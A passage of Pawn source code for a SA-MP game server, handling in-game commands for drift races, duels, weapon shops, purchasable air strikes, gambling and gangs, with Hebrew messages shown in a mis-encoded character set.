					SetVehiclePos(GetPlayerVehicleID(playerid),DriftPositions_1[1][0],DriftPositions_1[1][1],DriftPositions_1[1][2]);
					SetVehicleZAngle(GetPlayerVehicleID(playerid),DriftPositions_1[1][3]);
					SetPlayerRaceCheckpoint(playerid,0,DriftPositions_1[2][0],DriftPositions_1[2][1],DriftPositions_1[2][2],DriftPositions_1[3][0],DriftPositions_1[3][1],DriftPositions_1[3][2],14.5);
					SetPlayerRaceCheckpoint(playerinfo[playerid][dinvited],0,DriftPositions_1[2][0],DriftPositions_1[2][1],DriftPositions_1[2][2],DriftPositions_1[3][0],DriftPositions_1[3][1],DriftPositions_1[3][2],14.5);
				}
				case 2:
				{
					SetVehiclePos(GetPlayerVehicleID(playerinfo[playerid][dinvited]),DriftPositions_2[0][0],DriftPositions_2[0][1],DriftPositions_2[0][2]);
					SetVehicleZAngle(GetPlayerVehicleID(playerinfo[playerid][dinvited]),DriftPositions_2[0][3]);
					SetVehiclePos(GetPlayerVehicleID(playerid),DriftPositions_2[1][0],DriftPositions_2[1][1],DriftPositions_2[1][2]);
					SetVehicleZAngle(GetPlayerVehicleID(playerid),DriftPositions_2[1][3]);
					SetPlayerRaceCheckpoint(playerid,0,DriftPositions_2[2][0],DriftPositions_2[2][1],DriftPositions_2[2][2],DriftPositions_2[3][0],DriftPositions_2[3][1],DriftPositions_2[3][2],14.5);
					SetPlayerRaceCheckpoint(playerinfo[playerid][dinvited],0,DriftPositions_2[2][0],DriftPositions_2[2][1],DriftPositions_2[2][2],DriftPositions_2[3][0],DriftPositions_2[3][1],DriftPositions_2[3][2],14.5);
				}
				case 3:
				{
					SetVehiclePos(GetPlayerVehicleID(playerinfo[playerid][dinvited]),DriftPositions_3[0][0],DriftPositions_3[0][1],DriftPositions_3[0][2]);
					SetVehicleZAngle(GetPlayerVehicleID(playerinfo[playerid][dinvited]),DriftPositions_3[0][3]);
					SetVehiclePos(GetPlayerVehicleID(playerid),DriftPositions_3[1][0],DriftPositions_3[1][1],DriftPositions_3[1][2]);
					SetVehicleZAngle(GetPlayerVehicleID(playerid),DriftPositions_3[1][3]);
					SetPlayerRaceCheckpoint(playerid,0,DriftPositions_3[2][0],DriftPositions_3[2][1],DriftPositions_3[2][2],DriftPositions_3[3][0],DriftPositions_3[3][1],DriftPositions_3[3][2],14.5);
					SetPlayerRaceCheckpoint(playerinfo[playerid][dinvited],0,DriftPositions_3[2][0],DriftPositions_3[2][1],DriftPositions_3[2][2],DriftPositions_3[3][0],DriftPositions_3[3][1],DriftPositions_3[3][2],14.5);
				}
			}
			SetPlayerVirtualWorld(playerid,world);
			SetPlayerVirtualWorld(playerinfo[playerid][dinvited],world);
			SetVehicleVirtualWorld(GetPlayerVehicleID(playerid),world);
			SetVehicleVirtualWorld(GetPlayerVehicleID(playerinfo[playerid][dinvited]),world);
			SetCameraBehindPlayer(playerid);
			SetCameraBehindPlayer(playerinfo[playerid][dinvited]);
			SetFreeze(playerid,1);
			SetFreeze(playerinfo[playerid][dinvited],1);
		}
		else if(equal(cmd,"cancel"))
		{
			new string[M_S];
			if(playerinfo[playerid][indrift]) return SendClientMessage(playerid,red," .àúä ëáø áãøéôè");
			if(playerinfo[playerid][dinvited] == -1) return SendClientMessage(playerid,red," .ìà äåæîðú ìãøéôè");
			SendClientMessage(playerid,green," .áéèìú àú ääæîðä ìãøéôè");
			format(string,sizeof(string)," .áéèì àú ääæîðä ìãøéôè %s",GetName(playerid));
			SendClientMessage(playerinfo[playerid][dinvited],green,string);
			playerinfo[playerinfo[playerid][dinvited]][bet] = 0, playerinfo[playerinfo[playerid][dinvited]][dplace] = 0, playerinfo[playerinfo[playerid][dinvited]][dinvited] = -1, playerinfo[playerid][dinvited] = -1, playerinfo[playerid][dinviter] = 0, playerinfo[playerid][dplace] = 0;
		}
		else if(equal(cmd,"quit"))
		{
			new string[M_S];
			if(!playerinfo[playerid][indrift]) return SendClientMessage(playerid,red," .àúä ìà áãøéôè");
			SendClientMessage(playerid,green," .éöàú îäãøéôè");
			format(string,sizeof(string)," .ééöà îäãøéôè, ðéöçåï èëðé ìê %s",GetName(playerid));
			SendClientMessage(playerinfo[playerid][dinvited],green,string);
			GiveMoney(playerinfo[playerid][dinvited],playerinfo[playerinfo[playerid][dinvited]][bet]);
			SetVehicleToRespawn(GetPlayerVehicleID(playerid));
			SetVehicleToRespawn(GetPlayerVehicleID(playerinfo[playerid][dinvited]));
			SetPlayerVirtualWorld(playerid,world_normal);
			SetPlayerVirtualWorld(playerinfo[playerid][dinvited],world_normal);
			SetVehicleVirtualWorld(GetPlayerVehicleID(playerid),world_normal);
			SetVehicleVirtualWorld(GetPlayerVehicleID(playerinfo[playerid][dinvited]),world_normal);
			DisablePlayerRaceCheckpoint(playerid);
			DisablePlayerRaceCheckpoint(playerinfo[playerid][dinvited]);
			playerinfo[playerinfo[playerid][dinvited]][driftcp] = 0,
			playerinfo[playerinfo[playerid][dinvited]][indrift] = 0,
			playerinfo[playerinfo[playerid][dinvited]][bet] = 0,
			playerinfo[playerinfo[playerid][dinvited]][dinviter] = 0,
			playerinfo[playerinfo[playerid][dinvited]][dplace] = 0,
			playerinfo[playerinfo[playerid][dinvited]][dinvited] = -1;
			playerinfo[playerid][indrift] = 0,
			playerinfo[playerid][driftcp] = 0,
			playerinfo[playerid][bet] = 0,
			playerinfo[playerid][dinviter] = 0,
			playerinfo[playerid][dplace] = 0,
			playerinfo[playerid][dinvited] = -1;
		}
		else SendClientMessage(playerid,red," .àôùøåú ãøéôè ùâåéä");
		return 1;
	}
	if(equal(cmd,"/pbattle") || equal(cmd,"/duel"))
	{
		if(playerinfo[playerid][level] < 1) return SendClientMessage(playerid,red," .áëãé ìáöò àú äô÷åãä äæå òìéê ìäéåú áøîä 1");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || IsNumeric(cmd))
		{
			SendClientMessage(playerid,white," /pbattle [action] :öåøú äùéîåù");
			SendClientMessage(playerid,white," /pbattle invite [id/name] [place] [weapon] - äæîðä ì÷øá");
			SendClientMessage(playerid,white," /pbattle accept - àéùåø äæîðä ì÷øá");
			SendClientMessage(playerid,white," /pbattle cancel - áéèåì äæîðä ì÷øá");
			SendClientMessage(playerid,white," /pbattle quit - ìöàú îä÷øá äðåëçé ùìê");
			SendClientMessage(playerid,white," /pbattle weapons - øùéîú ðù÷éí îåúøéí ì÷øá");
			return 1;
		}
		if(equal(cmd,"invite"))
		{
			new id, battlew, all = (sizeof(Ammunation)+1), string[M_S], place;
			if(playerinfo[playerid][inbattle]) return SendClientMessage(playerid,red," .àúä ëáø á÷øá");
			if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid,red," .òìéê ìäéåú îçåõ ìøëá");
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd)) return SendClientMessage(playerid,white," /pbattle invite [id/name] [place] [weapon] :öåøú äùéîåù");
			id = ReturnUser(cmd);
			if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .àééãé ùâåé");
			if(id == playerid) return SendClientMessage(playerid,red," .àéðê éëåì ìäæîéï àú òöîê");
			cmd = strtok(cmdtext,idx), place = !strlen(cmd) || !IsNumeric(cmd)? 1:strval(cmd), cmd = strtok(cmdtext,idx), battlew = !strlen(cmd) || !IsNumeric(cmd)? all:strval(cmd);
			if(place < 1 || place > 3) return SendClientMessage(playerid,red," .îñôø î÷åí ÷øá ùâåé");
			if(battlew < 0 || battlew > all) return SendClientMessage(playerid,red," .ðù÷ ùâåé");
			if(playerinfo[id][inbattle]) return SendClientMessage(playerid,red," .äùç÷ï ùøöéú ìäæîéï ëáø á÷øá");
			if(battlew == all) format(string,sizeof(string)," .äæîéï àåúê ì÷øá òí äðù÷éí äðåëçééí ùìê áæéøä îñôø %d %s",place,GetName(playerid));
			else format(string,sizeof(string)," .áæéøä îñôø %d %s äæîéï àåúê ì÷øá òí äðù÷ %s",place,Ammunation[battlew][aName],GetName(playerid));
			SendClientMessage(id,green,string);
			SendClientMessage(id,yellow," /pbattlehelp :ìòæøä òí îòøëú ä÷øáåú äàéùééí");
			if(battlew == all) format(string,sizeof(string)," .ì÷øá òí äðù÷éí äðåëçééí ùìê áæéøä îñôø %d %s äæîðú àú",place,GetName(id));
			else format(string,sizeof(string)," .áæéøä îñôø %d %s ì÷øá òí äðù÷ %s äæîðú àú",place,Ammunation[battlew][aName],GetName(id));
			SendClientMessage(playerid,green,string);
			playerinfo[id][binvited] = playerid, playerinfo[playerid][binvited] = id, playerinfo[playerid][bweapon] = battlew, playerinfo[playerid][binviter] = 1, playerinfo[playerid][bplace] = place;
		}
		else if(equal(cmd,"accept"))
		{
			new string[M_S];
			if(playerinfo[playerid][dmzone] != dmz_none ||
			playerinfo[playerid][indrift] ||
			playerinfo[playerid][inbattle] ||
			playerinfo[playerid][inact] ||
			playerinfo[playerid][reqclass] ||
			playerinfo[playerid][die]) return SendClientMessage(playerid,red," .ìà ðéúï ìáöò àú äô÷åãä äæå áîöáê äðåëçé");
			if(playerinfo[playerid][inbattle]) return SendClientMessage(playerid,red," .àúä ëáø á÷øá");
			if(playerinfo[playerid][binvited] == -1 || playerinfo[playerid][binviter]) return SendClientMessage(playerid,red," .ìà äåæîðú ì÷øá");
			if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid,red," .òìéê ìäéåú îçåõ ìøëá");
			new world = GetEmptyWorld();
			if(world == -1) return SendClientMessage(playerid,red," .ìà äéä ðéúï ìäëðéñ àåúê ì÷øá");
			playerinfo[playerid][bweapon] = playerinfo[playerinfo[playerid][binvited]][bweapon],
			playerinfo[playerid][bplace] = playerinfo[playerinfo[playerid][binvited]][bplace],
			playerinfo[playerid][inbattle] = 1, playerinfo[playerinfo[playerid][binvited]][inbattle] = 1,
			playerinfo[playerid][bcd][0] = 5, playerinfo[playerinfo[playerid][binvited]][bcd][0] = 5;
			playerinfo[playerid][bcd][1] = SetTimerEx("BattleCD",1000,1,"ii",playerid,playerinfo[playerid][binvited]);
			SendClientMessage(playerid,green," .àéùøú àú ääæîðä ì÷øá");
			format(string,sizeof(string)," .àéùø àú ääæîðä ì÷øá %s",GetName(playerid));
			SendClientMessage(playerinfo[playerid][binvited],green,string);
			switch(playerinfo[playerid][bplace])
			{
				case 1:
				{
					SetPlayerPos(playerid,-1421.7825,1243.6096,1039.8672);
					SetPlayerFacingAngle(playerid,276.9759);
					SetCameraBehindPlayer(playerid);
					SetPlayerInterior(playerid,16);
					SetPlayerPos(playerinfo[playerid][binvited],-1370.9805,1250.0369,1039.8672);
					SetPlayerFacingAngle(playerinfo[playerid][binvited],96.2371);
					SetCameraBehindPlayer(playerinfo[playerid][binvited]);
					SetPlayerInterior(playerinfo[playerid][binvited],16);
				}
				case 2:
				{
					SetPlayerPos(playerid,1376.9642,786.0403,10.8203);
					SetPlayerFacingAngle(playerid,178.8121);
					SetCameraBehindPlayer(playerid);
					SetPlayerInterior(playerid,0);
					SetPlayerPos(playerinfo[playerid][binvited],1374.9430,674.0170,10.8280);
					SetPlayerFacingAngle(playerinfo[playerid][binvited],179.1254);
					SetCameraBehindPlayer(playerinfo[playerid][binvited]);
					SetPlayerInterior(playerinfo[playerid][binvited],0);
				}
				case 3:
				{
					SetPlayerPos(playerid,2263.3147,578.8705,7.7813);
					SetPlayerFacingAngle(playerid,266.5969);
					SetCameraBehindPlayer(playerid);
					SetPlayerInterior(playerid,0);
					SetPlayerPos(playerinfo[playerid][binvited],2364.4868,578.7991,7.7813);
					SetPlayerFacingAngle(playerinfo[playerid][binvited],91.1285);
					SetCameraBehindPlayer(playerinfo[playerid][binvited]);
					SetPlayerInterior(playerinfo[playerid][binvited],0);
				}
			}
			SetPlayerVirtualWorld(playerid,world);
			SetPlayerVirtualWorld(playerinfo[playerid][binvited],world);
			if(playerinfo[playerid][bweapon] != (sizeof(Ammunation)+1))
			{
				ResetWeapons(playerid);
				ResetWeapons(playerinfo[playerid][binvited]);
				GiveWeapon(playerid,Ammunation[playerinfo[playerid][bweapon]][aID],100000);
				GiveWeapon(playerinfo[playerid][binvited],Ammunation[playerinfo[playerinfo[playerid][binvited]][bweapon]][aID],100000);
			}
			SetPlayerHealth2(playerid,100.0);
			SetPlayerArmour2(playerid,100.0);
			SetPlayerHealth2(playerinfo[playerid][binvited],100.0);
			SetPlayerArmour2(playerinfo[playerid][binvited],100.0);
			SetFreeze(playerid,1);
			SetFreeze(playerinfo[playerid][binvited],1);
		}
		else if(equal(cmd,"cancel"))
		{
			new string[M_S];
			if(playerinfo[playerid][inbattle]) return SendClientMessage(playerid,red," .àúä ëáø á÷øá");
			if(playerinfo[playerid][binvited] == -1) return SendClientMessage(playerid,red," .ìà äåæîðú ì÷øá");
			SendClientMessage(playerid,green," .áéèìú àú ääæîðä ì÷øá");
			format(string,sizeof(string)," .áéèì àú ääæîðä ì÷øá %s",GetName(playerid));
			SendClientMessage(playerinfo[playerid][binvited],green,string);
			playerinfo[playerinfo[playerid][binvited]][binvited] = -1, playerinfo[playerid][binvited] = -1, playerinfo[playerid][binviter] = 0;
		}
		else if(equal(cmd,"quit"))
		{
			new string[M_S];
			if(!playerinfo[playerid][inbattle]) return SendClientMessage(playerid,red," .àúä ìà á÷øá");
			SendClientMessage(playerid,green," .éöàú îä÷øá");
			format(string,sizeof(string)," .ééöà îä÷øá, ðéöçåï èëðé ìê %s",GetName(playerid));
			SendClientMessage(playerinfo[playerid][binvited],green,string);
			SetPlayerVirtualWorld(playerid,world_normal);
			SetPlayerVirtualWorld(playerinfo[playerid][binvited],world_normal);
			ResetWeapons(playerid);
			SpawnPlayer(playerid);
			ResetWeapons(playerinfo[playerid][binvited]);
			SpawnPlayer(playerinfo[playerid][binvited]);
			playerinfo[playerinfo[playerid][binvited]][inbattle] = 0, playerinfo[playerinfo[playerid][binvited]][binvited] = -1;
			playerinfo[playerid][inbattle] = 0, playerinfo[playerid][binvited] = -1;
		}
		else if(equal(cmd,"weapons"))
		{
			new string[M_S];
			SendClientMessage(playerid,lightblue," ~~~ :øùéîú äðù÷éí ì÷øáåú àéùééí ~~~");
			SendClientMessage(playerid,yellow,"  /wl :ìøùéîú äðù÷éí äîåúøéí ì÷øáåú");
			format(string,sizeof(string),"  ðù÷ îñôø %d äåà ëì äðù÷éí ùéù ìê åìéøéáê",sizeof(Ammunation)+1);
			SendClientMessage(playerid,yellow,string);
		}
		else SendClientMessage(playerid,red," .àôùøåú ÷øá ùâåéä");
		return 1;
	}
	if(equal(cmd,"/sbuyweapon") || equal(cmd,"/sbw"))
	{
		new weaponid, times, string[M_S];
		if(playerinfo[playerid][level] < 3) return SendClientMessage(playerid,red," .áëãé ìáöò àú äô÷åãä äæå òìéê ìäéåú áøîä 3");
		if(GetPlayerCheckpoint(playerid) != cp_sammu || !IsPlayerInCheckpoint(playerid)) return SendClientMessage(playerid,red," .òìéê ìäéåú áçðåú äðù÷éí äñåãéú áëãé ìáöò ô÷åãä æå");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || !IsNumeric(cmd)) return SendClientMessage(playerid,white," /sbw [weapon number] [times] :öåøú äùéîåù");
		weaponid = strval(cmd), cmd = strtok(cmdtext,idx), times = !strlen(cmd) || !IsNumeric(cmd) ? 1 : strval(cmd);
		if(weaponid < 0 || weaponid > sizeof(SAmmunation)) return SendClientMessage(playerid,red," .îñôø ðù÷ ùâåé");
		if(times < 1) return SendClientMessage(playerid,red," .îñôø ôòîé ÷ðééä ðîåê îãé");
		if(times > 20) return SendClientMessage(playerid,red," .îñôø ôòîé ÷ðééä âãåì îãé - î÷ñéîåí 20 ôòîéí");
		if(GetMoney(playerid) < (SAmmunation[weaponid][aCost]*times)) return SendClientMessage(playerid,red," .àéï ìê îñôé÷ ëñó áëãé ì÷ðåú àú äðù÷ äæä");
		GiveWeapon(playerid,SAmmunation[weaponid][aID],SAmmunation[weaponid][aAmmo]*times);
		GiveMoney(playerid,0-(SAmmunation[weaponid][aCost]*times));
		if(times != 1) format(string,sizeof(string)," .îçðåú äðù÷éí äñåãéú %s øëùú %d ôòîéí àú äðù÷",SAmmunation[weaponid][aName],times);
		else format(string,sizeof(string)," .îçðåú äðù÷éí äñåãéú %s øëùú àú äðù÷",SAmmunation[weaponid][aName]);
		SendClientMessage(playerid,green,string);
		return 1;
	}
	if(equal(cmd,"/sweaponlist") || equal(cmd,"/swl"))
	{
		new string[M_S];
		if(playerinfo[playerid][level] < 3) return SendClientMessage(playerid,red," .áëãé ìáöò àú äô÷åãä äæå òìéê ìäéåú áøîä 3");
		if(GetPlayerCheckpoint(playerid) != cp_sammu || !IsPlayerInCheckpoint(playerid)) return SendClientMessage(playerid,red," .òìéê ìäéåú áçðåú äðù÷éí äñåãéú áëãé ìáöò ô÷åãä æå");
		SendClientMessage(playerid,lightblue," ~~~ :øùéîú äðù÷éí ùì çðåú äðù÷éí äñåãéú ~~~");
		for(new i=0;i<sizeof(SAmmunation);i+=2)
		{
			format(string,sizeof(string)," %d. %s - %d$ | %d. %s - %d$",i,SAmmunation[i][aName],SAmmunation[i][aCost],i+1,SAmmunation[i+1][aName],SAmmunation[i+1][aCost]);
			SendClientMessage(playerid,yellow,string);
		}
		return 1;
	}
	if(equal(cmd,"/ccsbuyweapon") || equal(cmd,"/ccsbw"))
	{
		new weaponid, times, string[M_S];
		if(playerinfo[playerid][level] < 3) return SendClientMessage(playerid,red," .áëãé ìáöò àú äô÷åãä äæå òìéê ìäéåú áøîä 3");
		if(GetPlayerCheckpoint(playerid) != cp_sammu || !IsPlayerInCheckpoint(playerid)) return SendClientMessage(playerid,red," .òìéê ìäéåú áçðåú äðù÷éí äñåãéú áëãé ìáöò ô÷åãä æå");
		if(!playerinfo[playerid][ccard]) return SendClientMessage(playerid,red," .àéï ìê ëøèéñ àùøàé");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || !IsNumeric(cmd)) return SendClientMessage(playerid,white," /ccsbw [weapon number] [times] :öåøú äùéîåù");
		weaponid = strval(cmd), cmd = strtok(cmdtext,idx), times = !strlen(cmd) || !IsNumeric(cmd) ? 1 : strval(cmd);
		if(weaponid < 0 || weaponid > sizeof(SAmmunation)) return SendClientMessage(playerid,red," .îñôø ðù÷ ùâåé");
		if(times < 1) return SendClientMessage(playerid,red," .îñôø ôòîé ÷ðééä ðîåê îãé");
		if(times > 20) return SendClientMessage(playerid,red," .îñôø ôòîé ÷ðééä âãåì îãé - î÷ñéîåí 20 ôòîéí");
		if(playerinfo[playerid][bank] < (SAmmunation[weaponid][aCost]*times)) return SendClientMessage(playerid,red," .àéï ìê îñôé÷ ëñó áëãé ì÷ðåú àú äðù÷ äæä");
		GiveWeapon(playerid,SAmmunation[weaponid][aID],SAmmunation[weaponid][aAmmo]*times);
		playerinfo[playerid][bank] -= (SAmmunation[weaponid][aCost]*times);
		if(playerinfo[playerid][logged]) fsetint(fuser(playerid),"BankCash",playerinfo[playerid][bank]);
		if(times != 1) format(string,sizeof(string)," .îçðåú äðù÷éí äñåãéú áëøèéñ àùøàé %s øëùú %d ôòîéí àú äðù÷",SAmmunation[weaponid][aName],times);
		else format(string,sizeof(string)," .îçðåú äðù÷éí äñåãéú áëøèéñ àùøàé %s øëùú àú äðù÷",SAmmunation[weaponid][aName]);
		SendClientMessage(playerid,green,string);
		format(string,sizeof(string)," (îñôø ôòîéí: %d) %s ÷ðéú áòæøú ëøèéñ àùøàé îçðåú äðù÷éí äñåãéú àú äðù÷",times,SAmmunation[weaponid][aName]);
		BankLog(GetName(playerid),string,SAmmunation[weaponid][aCost]*times);
		return 1;
	}
	if(equal(cmd,"/aasave"))
	{
		new Float:p[3];
		if(playerinfo[playerid][level] < 3) return SendClientMessage(playerid,red," .áëãé ìáöò àú äô÷åãä äæå òìéê ìäéåú áøîä 3");
		if(playerinfo[playerid][reqclass]) return SendClientMessage(playerid,red," .ìà ðéúï ìäùúîù áîú÷ôåú àåéøéåú ëàùø àúä ááçéøú äãîåéåú");
		if(playerinfo[playerid][modeafk]) return SendClientMessage(playerid,red," .AFK ìà ðéúï ìäùúîù áîú÷ôåú àåéøéåú ëàùø àúä áîöá");
		if(playerinfo[playerid][inact]) return SendClientMessage(playerid,red," .ìà ðéúï ìäùúîù áô÷åãä æå ëàùø àúä áôòéìåú");
		if(GetMoney(playerid) < 1000) return SendClientMessage(playerid,red," .àéï ìê îñôé÷ ëñó");
		if(GetPlayerInterior(playerid) != 0) return SendClientMessage(playerid,red," .àñåø ìùîåø ëàï îú÷ôä àåéøéú");
		if(GetPlayerVirtualWorld(playerid) != world_normal) return SendClientMessage(playerid,red," .òìéê ìäéåú áòåìí äøâéì");
		GiveMoney(playerid,0-1000);
		GetPlayerPos(playerid,p[0],p[1],p[2]);
		for(new i=0;i<3;i++) playerinfo[playerid][aapos][i] = p[i];
		SendClientMessage(playerid,green," .îé÷åí äîìçîä äàåéøéú ùìê ðùîø");
		return 1;
	}
	if(equal(cmd,"/aa1"))
	{
		if(playerinfo[playerid][level] < 3) return SendClientMessage(playerid,red," .áëãé ìáöò àú äô÷åãä äæå òìéê ìäéåú áøîä 3");
		if(playerinfo[playerid][reqclass]) return SendClientMessage(playerid,red," .ìà ðéúï ìäùúîù áîú÷ôåú àåéøéåú ëàùø àúä ááçéøú äãîåéåú");
		if(playerinfo[playerid][modeafk]) return SendClientMessage(playerid,red," .AFK ìà ðéúï ìäùúîù áîú÷ôåú àåéøéåú ëàùø àúä áîöá");
		if(playerinfo[playerid][inact]) return SendClientMessage(playerid,red," .ìà ðéúï ìäùúîù áô÷åãä æå ëàùø àúä áôòéìåú");
		if(playerinfo[playerid][aapos][0] == 0.0 || playerinfo[playerid][aapos][1] == 0.0 || playerinfo[playerid][aapos][2] == 0.0) return SendClientMessage(playerid,red," .àéï ìê îé÷åí îú÷ôä ùîåø");
		if(playerinfo[playerid][aause]) return SendClientMessage(playerid,red," .àúä ëáø îùúîù áîú÷ôú àåéø");
		if(GetMoney(playerid) < 12000) return SendClientMessage(playerid,red," .àéï ìê îñôé÷ ëñó, äîú÷ôä äàåéøéú äøàùåðä òåìä 12000$");
		for(new i=0;i<MAX_PLAYERS;i++) if(IsPlayerConnected(i) && playerinfo[i][level] >= 3 && playerinfo[i][aause] && GetDistanceBetweenPlayers(playerid,i) <= 250.0) return SendClientMessage(playerid,red," .îéùäå ëáø îùúîù áîú÷ôä àåéøéú áàéæåø æä");
		GiveMoney(playerid,0-12000);
		playerinfo[playerid][aav1] = CreateVehicleEx(520,playerinfo[playerid][aapos][0],playerinfo[playerid][aapos][1]-200.0,playerinfo[playerid][aapos][2]+57.0,0.0,-1,-1,respawntime,GetPlayerInterior(playerid),GetPlayerVirtualWorld(playerid));
		playerinfo[playerid][aatimer] = SetTimerEx("AirAttack1",500,1,"d",playerid);
		playerinfo[playerid][aause] = 1;
		playerinfo[playerid][aasetp] = (0-200);
		SendClientMessage(playerid,green," !ääú÷ôä ðùìçä");
		return 1;
	}
	if(equal(cmd,"/aa2"))
	{
		if(playerinfo[playerid][level] < 6) return SendClientMessage(playerid,red," .áëãé ìáöò àú äô÷åãä äæå òìéê ìäéåú áøîä 6");
		if(playerinfo[playerid][reqclass]) return SendClientMessage(playerid,red," .ìà ðéúï ìäùúîù áîú÷ôåú àåéøéåú ëàùø àúä ááçéøú äãîåéåú");
		if(playerinfo[playerid][modeafk]) return SendClientMessage(playerid,red," .AFK ìà ðéúï ìäùúîù áîú÷ôåú àåéøéåú ëàùø àúä áîöá");
		if(playerinfo[playerid][inact]) return SendClientMessage(playerid,red," .ìà ðéúï ìäùúîù áô÷åãä æå ëàùø àúä áôòéìåú");
		if(playerinfo[playerid][aapos][0] == 0.0 || playerinfo[playerid][aapos][1] == 0.0 || playerinfo[playerid][aapos][2] == 0.0) return SendClientMessage(playerid,red," .àéï ìê îé÷åí îú÷ôä ùîåø");
		if(playerinfo[playerid][aause]) return SendClientMessage(playerid,red," .àúä ëáø îùúîù áîú÷ôú àåéø");
		if(GetMoney(playerid) < 20000) return SendClientMessage(playerid,red," .àéï ìê îñôé÷ ëñó, äîú÷ôä äàåéøéú äùðééä òåìä 20000$");
		for(new i=0;i<MAX_PLAYERS;i++) if(IsPlayerConnected(i) && playerinfo[i][level] >= 3 && playerinfo[i][aause] && GetDistanceBetweenPlayers(playerid,i) <= 250.0) return SendClientMessage(playerid,red," .îéùäå ëáø îùúîù áîú÷ôä àåéøéú áàéæåø æä");
		GiveMoney(playerid,0-20000);
		playerinfo[playerid][aav2][0] = CreateVehicleEx(425,playerinfo[playerid][aapos][0]-5.0,playerinfo[playerid][aapos][1]-200.0,playerinfo[playerid][aapos][2]+57.0,0.0,-1,-1,respawntime,GetPlayerInterior(playerid),GetPlayerVirtualWorld(playerid));
		playerinfo[playerid][aav2][1] = CreateVehicleEx(425,playerinfo[playerid][aapos][0]+5.0,playerinfo[playerid][aapos][1]-200.0,playerinfo[playerid][aapos][2]+57.0,0.0,-1,-1,respawntime,GetPlayerInterior(playerid),GetPlayerVirtualWorld(playerid));
		playerinfo[playerid][aatimer] = SetTimerEx("AirAttack2",400,1,"d",playerid);
		playerinfo[playerid][aause] = 1;
		playerinfo[playerid][aasetp] = (0-200);
		SendClientMessage(playerid,green," !ääú÷ôä ðùìçä");
		return 1;
	}
	if(equal(cmd,"/aa3"))
	{
		if(playerinfo[playerid][level] < 10) return SendClientMessage(playerid,red," .áëãé ìáöò àú äô÷åãä äæå òìéê ìäéåú áøîä 10");
		if(playerinfo[playerid][reqclass]) return SendClientMessage(playerid,red," .ìà ðéúï ìäùúîù áîú÷ôåú àåéøéåú ëàùø àúä ááçéøú äãîåéåú");
		if(playerinfo[playerid][modeafk]) return SendClientMessage(playerid,red," .AFK ìà ðéúï ìäùúîù áîú÷ôåú àåéøéåú ëàùø àúä áîöá");
		if(playerinfo[playerid][inact]) return SendClientMessage(playerid,red," .ìà ðéúï ìäùúîù áô÷åãä æå ëàùø àúä áôòéìåú");
		if(playerinfo[playerid][aapos][0] == 0.0 || playerinfo[playerid][aapos][1] == 0.0 || playerinfo[playerid][aapos][2] == 0.0) return SendClientMessage(playerid,red," .àéï ìê îé÷åí îú÷ôä ùîåø");
		if(playerinfo[playerid][aause]) return SendClientMessage(playerid,red," .àúä ëáø îùúîù áîú÷ôú àåéø");
		if(GetMoney(playerid) < 35000) return SendClientMessage(playerid,red," .àéï ìê îñôé÷ ëñó, äîú÷ôä äùìéùéú òåìä 35000$");
		for(new i=0;i<MAX_PLAYERS;i++) if(IsPlayerConnected(i) && playerinfo[i][level] >= 3 && playerinfo[i][aause] && GetDistanceBetweenPlayers(playerid,i) <= 250.0) return SendClientMessage(playerid,red," .îéùäå ëáø îùúîù áîú÷ôä àåéøéú áàéæåø æä");
		GiveMoney(playerid,0-35000);
		playerinfo[playerid][aav3][0] = CreateVehicleEx(425,playerinfo[playerid][aapos][0]-5.2,playerinfo[playerid][aapos][1]-200.0,playerinfo[playerid][aapos][2]+57.0,0.0,-1,-1,respawntime,GetPlayerInterior(playerid),GetPlayerVirtualWorld(playerid));
		playerinfo[playerid][aav3][1] = CreateVehicleEx(425,playerinfo[playerid][aapos][0]+5.2,playerinfo[playerid][aapos][1]-200.0,playerinfo[playerid][aapos][2]+57.0,0.0,-1,-1,respawntime,GetPlayerInterior(playerid),GetPlayerVirtualWorld(playerid));
		playerinfo[playerid][aav3][2] = CreateVehicleEx(520,playerinfo[playerid][aapos][0]-12.5,playerinfo[playerid][aapos][1]-200.0,playerinfo[playerid][aapos][2]+57.0,0.0,-1,-1,respawntime,GetPlayerInterior(playerid),GetPlayerVirtualWorld(playerid));
		playerinfo[playerid][aav3][3] = CreateVehicleEx(520,playerinfo[playerid][aapos][0]+12.5,playerinfo[playerid][aapos][1]-200.0,playerinfo[playerid][aapos][2]+57.0,0.0,-1,-1,respawntime,GetPlayerInterior(playerid),GetPlayerVirtualWorld(playerid));
		playerinfo[playerid][aatimer] = SetTimerEx("AirAttack3",300,1,"d",playerid);
		playerinfo[playerid][aause] = 1;
		playerinfo[playerid][aasetp] = (0-200);
		SendClientMessage(playerid,green," !ääú÷ôä ðùìçä");
		return 1;
	}
	if(equal(cmd,"/gambling"))
	{
		new gamb, win = randomEx(0,6), string[M_S];
		if(playerinfo[playerid][level] < 2) return SendClientMessage(playerid,red," .áëãé ìáöò àú äô÷åãä äæå òìéê ìäéåú áøîä 2");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || !IsNumeric(cmd)) return SendClientMessage(playerid,white," /gambling [money] :öåøú äùéîåù");
		gamb = strval(cmd);
		if(gamb < 0 || gamb > GetMoney(playerid)) return SendClientMessage(playerid,red," .àéï ìê îñôé÷ ëñó");
		if(gamb > 1000000) return SendClientMessage(playerid,red," .äî÷ñéîåí ìäéîåø äéðå 1000000$");
		GiveMoney(playerid,0-gamb);
		if(win == 5)
		{
			GiveMoney(playerid,gamb*2);
			format(string,sizeof(string)," !æëéú á %d$",gamb*2);
			SendClientMessage(playerid,orange,string);
		}
		else SendClientMessage(playerid,red," !ìà æëéú");
		return 1;
	}
	if(equal(cmd,"/gang"))
	{
		new string[M_S];
		if(playerinfo[playerid][level] < 2) return SendClientMessage(playerid,red," .ðéúï ìôúåç ëðåôééä ø÷ îøîä 2 åîòìä");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd))
		{
			SendClientMessage(playerid,white," /gang create [name] :éöéøú ëðåôééä");
			SendClientMessage(playerid,white," /gang invite [id/name] :äæîðä ìëðåôééä");
			SendClientMessage(playerid,white," /gang accept :àéùåø äæîðä ìëðåôééä");
			SendClientMessage(playerid,white," /gang cancel :áéèåì äæîðä ìëðåôééä");
